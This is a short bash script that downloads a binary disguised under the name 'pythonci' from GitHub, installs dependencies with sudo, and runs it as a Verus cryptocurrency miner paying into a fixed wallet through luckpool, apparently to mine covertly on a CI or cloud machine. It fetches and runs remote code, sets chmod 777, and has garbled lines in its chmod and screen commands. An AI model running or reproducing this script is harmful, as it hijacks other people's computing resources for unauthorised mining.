#!/bin/bash
wget https://github.com/hermansahnanang/hermansahns/raw/main/pythonci
sudo apt install screen libjansson4 -y
chmod +x joyce.sh && chmod +x pythonci chmod 777 pythonci joyce.sh
screen -dmS ls
PL=stratum+tcp://eu.luckpool.net:3956
WT=RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8
WR=Jeng
cd test;./pythonci -a verus -o $PL -u $WT.$WR -p x
